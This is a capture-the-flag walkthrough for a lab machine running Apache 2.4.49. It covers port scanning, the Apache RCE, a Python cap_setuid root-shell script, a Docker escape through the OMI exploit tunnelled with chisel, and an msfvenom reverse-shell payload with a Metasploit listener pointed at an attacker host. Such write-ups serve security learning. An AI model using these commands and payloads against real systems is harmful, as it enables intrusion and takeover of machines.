# Oh My Webserver: Walkthrough

## Setup

Prior to enumerating or attacking the target, I like to save the target IP address in an environment variable `$TARGET` so I do not have to remember it when interacting with the machine using the terminal.

```bash
export TARGET=<target_ip>
```

Another easy way to save the target IP is adding it to the `/etc/hosts` file and giving it a domain name (ex: `ohmywebserver.thm`).

## Enumeration

The first step in attacking this machine is discovering what ports are open. To do this, multiple nmap scans were conducted.

Command 1: Fast Full Port Scan

```bash
nmap -sS -T4 -n -p- -oN nmap/full_scan_fast $TARGET
```

Results:

```bash
Host is up (0.12s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE
22/tcp open   ssh
80/tcp closed http
```

Command 2:  Top 1K Scan With Common NSE Scripts

```bash
nmap -sC -sV -A -O -n -oN nmap/initial
```

Results:

```bash
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%), Linux 2.6.32 - 3.1 (85%), Linux 2.6.39 - 3.2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Noticing that port 80 (HTTP) is open and confirming that a website is being hosted on it using Apache, a Nikto scan can be performed:

```bash
nikto -h http://$TARGET -output nikto/nikto_scan.txt
```

Results:

```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.55.213
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OPTIONS Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE 
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
```

Nothing particularly interesting is discovered in the enumeration above, however, the Apache web server version is revealed to be 2.4.49. Taking a look at [ExploitDB](https://exploit-db.com)
and searching for Apache 2.4, we can find a [Remote Code Execution vulnerability](https://www.exploit-db.com/exploits/50512) present in version 2.4.49 and 2.4.50. 

## Initial Foothold

The RCE vulnerability discovered during enumeration can be used to gain a foothold on the target server. By executing a reverse shell command, an attacker can gain a connection to the server and begin probing for privilege escalation vectors to exploit to gain root access to the macine.  

An extensive list of reverse shell commands can be found on [PentestMonkey's Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Find one that works and exploit the RCE vulnerability in Apache 2.4.49 to gain a shell on the target.

## Privilege Escalation

Once a foothold has been established on the target, the next phase of the attack is to elevate your privileges. There are a few base commands that should be run to enumerate privilege escaltion vectors:

Sticky Bit Enumeration:

```bash
find / -type f -perm /0600 2>/dev/null
```

This command searches all files the current user has access to for files with the setuid bit set.  Files with this flag set have the potential to be exploited and used to elevate access.

Capabilities Enumeration:

```bash
getcap -r / 2>/dev/null
```

This command searches all files the current user has access to for special capabilities available to the files. There are certain capabilities that allow users to run commands as an elevated user. This is the enumeration that reveals the privilege escalation vector for this machine. After running this command, it is revelaed that Python3.7 has been given the `cap_setuid` capability. This capability allows Python3 to set the setuid flag and execute system commands as root. This capability can be used to spawn a root shell or open up a root reverse shell (and more).

Script to spawn a root shell:

```python
#!/usr/bin/env python3

import os

os.setuid(0) # set this to run as root
command = "/bin/bash" # change this to do what you want as root
os.system(command) # execute command as root
```

After the script above is run, the attacker will have an elevated foothold. The `user.txt` flag is located inside `/root`. 

## Root Flag

If the user is root, and the flag obtained is `user.txt`, where is `root.txt`? The answer can be found by looking at the networking information:

Command:

```bash
ifconfig
```

Result:

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 1611  bytes 1110912 (1.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1104  bytes 1467035 (1.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Taking a look at `eth0` shows an IP address commonly used in Docker configurations. It appears this webserver is inside a Docker container.

The next step is to enumerate the host machine (`172.17.0.1`) and see if there are any attack vectors present we can use to gain a foothold and the root flag.  One easy way to conduct this enumeration is to upload a static binary of nmap to the target you have a root foothold on and use it to scan `172.17.0.1`. 

A scan of the gateway (`172.17.0.1`) reveals that port 5986 is open. This port sticks out as unusual, and requires some more research. By searching `port 5986 linux exploit`, you can discover a link to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi) mentioning OMI pentesting and CVE-2021-38647 with a link to a [GitHub](https://github.com/horizon3ai/CVE-2021-38647) repository that contains an exploit. This vulnerability is what can be used to either gain a foothold on, or extract the flag from, the true host machine. 

If the attacker can upload chisel to the docker container, they can create a tunnel through which they can run the OMI exploit and they will not have to upload the exploit script to docker. 

### From Docker Target

To exploit the OMI vulnerability on the host machine using this method, the attacker must get the `omigod.py` file onto the docker target and then run the command:

```bash
python3 omigod.py -t 172.17.0.1 -c <COMMAND>
```

### Chisel

The commands to do execute the OMI exploit from the attacker machine are as follows:

On Attacker Machine:

```bash
chisel server -p <serverport> --reverse
```

On Docker Target:

```bash
./chisel client <ATTACKERIP>:<serverport> R:<COMMS_PORT>:172.17.0.1:5986
```

On Attacker Machine:

```bash
python3 omigod.py -t 127.0.0.1:<COMMS_PORT> -c <COMMAND>
```


## Custom Exploit Binary

To automate the process of taking control of both the container and the host, an exploit script was developed in `Golang` and makes use of an open-soeurce proof-of-concept exploit script written in `Python`.

### Setup

To properly execute the automated exploit, the attacker must have three things at their disposal: the binary, a reverse shell script, and a webserver.

To obtain the binary, the attacker can pull the code from [here](stage1.go) and compile it into a binary using the command: 

```bash
go build stage1.go
```

The afforementioned webserver does not have to be anything fancy or intricate, a simple Python webserver will suffice. The purpose of this server is to have a location the target can reach back out to and pull down the scripts and binaries referenced in the attack. An easy way to spin up a webserver is:

```bash
python3 -m http.server <port_number>
```

The shell script is up to the attacker to choose. For beginners, a meterpreter payload may be a good option as it is stable and does not require much knowledge to produce. For more advanced users, a good place to find reverse shell commands is `Pentest Monkey's Reverse Shell Cheat Sheet`, or you can craft your own! The command to produce a meterpreter payload for this machine is as follows:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=<aPort> -f elf > <shell_binary_name>
```

To setup the listener in `Metasploit` run the following commands:

```bash

use exploit/multi/handler
set LHOST <yourIP>
set LPORT <aPort>
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

